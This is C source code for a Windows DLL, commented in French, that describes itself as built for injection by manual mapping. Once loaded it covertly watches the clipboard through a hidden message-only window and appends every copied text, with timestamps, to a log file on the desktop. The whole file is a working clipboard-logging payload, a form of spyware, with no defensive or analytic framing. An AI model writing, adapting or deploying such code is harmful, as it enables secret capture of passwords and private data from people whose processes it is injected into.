/**
 * @file clipboard-logger.c
 * @brief Implémentation d'une DLL de surveillance du presse-papiers.
 * 
 * Cette DLL est conçue pour être injectée via un mappage manuel.
 * Elle utilise l'API Windows pour surveiller les changements du presse-papiers
 * et logue le contenu textuel dans un fichier sur le bureau de l'utilisateur.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600 // Windows Vista ou supérieur pour AddClipboardFormatListener
#endif
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>

// Nom de la classe de fenêtre invisible pour recevoir les notifications du presse-papiers
#define WINDOW_CLASS_NAME "ClipboardLoggerClass"
#define LOG_FILE_NAME "clipboard_log.txt"

// Variables globales
HINSTANCE g_hInstance = NULL;
HWND g_hWndNextViewer = NULL;
HWND g_hWorkerWnd = NULL;
HANDLE g_hThread = NULL;

/**
 * @brief Récupère le chemin du fichier de log sur le bureau.
 * @param buffer Buffer pour stocker le chemin.
 * @param size Taille du buffer.
 */
void GetLogFilePath(char* buffer, size_t size) {
    CHAR desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
        snprintf(buffer, size, "%s\\%s", desktopPath, LOG_FILE_NAME);
    } else {
        // Fallback sur le répertoire courant si le bureau n'est pas accessible
        snprintf(buffer, size, ".\\%s", LOG_FILE_NAME);
    }
}

/**
 * @brief Logue le texte dans le fichier sur le bureau.
 * @param text Texte à concaténer.
 */
void LogClipboardText(const char* text) {
    if (!text || text[0] == '\0') return;

    char logPath[MAX_PATH];
    GetLogFilePath(logPath, sizeof(logPath));

    FILE* f = fopen(logPath, "a");
    if (f) {
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        char timeStr[64];
        strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
        
        fprintf(f, "%s\n%s\n-----------------------------------\n", timeStr, text);
        fclose(f);
    }
}

/**
 * @brief Procédure de fenêtre pour traiter les messages du presse-papiers.
 */
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CLIPBOARDUPDATE: {
            if (OpenClipboard(hWnd)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = (char*)GlobalLock(hData);
                    if (pszText) {
                        LogClipboardText(pszText);
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
            break;
        }
        case WM_DESTROY:
            RemoveClipboardFormatListener(hWnd);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, uMsg, wParam, lParam);
    }
    return 0;
}

/**
 * @brief Fonction principale du thread de surveillance.
 */
DWORD WINAPI MonitorThread(LPVOID lpParam) {
    WNDCLASSEXA wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = g_hInstance;
    wc.lpszClassName = WINDOW_CLASS_NAME;

    if (!RegisterClassExA(&wc)) return 1;

    // Création d'une fenêtre invisible pour écouter les événements
    g_hWorkerWnd = CreateWindowExA(0, WINDOW_CLASS_NAME, "Clipboard Logger Worker", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, g_hInstance, NULL);
    
    if (g_hWorkerWnd) {
        AddClipboardFormatListener(g_hWorkerWnd);
        
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

/**
 * @brief Point d'entrée de la DLL.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    g_hInstance = hinstDLL;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Désactiver les appels de thread pour optimiser
            DisableThreadLibraryCalls(hinstDLL);
            // Lancer le thread de surveillance
            g_hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            if (g_hWorkerWnd) {
                SendMessage(g_hWorkerWnd, WM_CLOSE, 0, 0);
            }
            if (g_hThread) {
                WaitForSingleObject(g_hThread, 1000);
                CloseHandle(g_hThread);
            }
            break;
    }
    return TRUE;
}
